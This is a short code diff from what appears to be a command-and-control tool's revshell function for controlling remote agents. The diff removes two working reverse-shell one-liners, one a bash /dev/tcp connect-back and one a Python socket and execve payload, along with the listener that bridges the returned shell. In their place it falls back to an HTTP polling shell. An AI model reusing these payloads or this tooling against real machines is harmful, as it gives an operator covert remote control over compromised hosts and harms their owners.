@@ -106,31 +106,7 @@ def revshell(manager, agent_id, c2_server):
         _fast_http_shell(manager, agent_id)
         return
 
-    _write(f"{Fore.CYAN}[*] TCP listener on 0.0.0.0:{port}{Style.RESET_ALL}\n")
-
-    # Fast TCP attempt
-    payloads = [
-        (f"bash -c 'exec 3<>/dev/tcp/{LOCAL_IP}/{port}; cat <&3 | TERM=dumb /bin/sh -i >&3 2>&3'", "bash → LAN"),
-        (f"python3 -c \"import socket,os;s=socket.socket();s.settimeout(8);s.connect(('{LOCAL_IP}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2));os.execve('/bin/sh',['/bin/sh'],os.environ)\"", "python3 → LAN"),
-    ]
-
-    srv.settimeout(4)
-    for payload, label in payloads:
-        _send_task(manager, agent_id, payload, label)
-        for _ in range(2):
-            try:
-                srv.settimeout(4)
-                conn, addr = srv.accept()
-                srv.close()
-                _pty_bridge(conn)
-                return
-            except socket.timeout:
-                continue
-            except OSError:
-                break
-
-    srv.close()
-    _write(f"{Fore.YELLOW}[!] TCP connect-back failed, falling back to fast HTTP PTY shell{Style.RESET_ALL}\n")
+    _write(f"{Fore.CYAN}[*] Starting shell via HTTP (fast polling){Style.RESET_ALL}\n")
     _fast_http_shell(manager, agent_id)
 
 
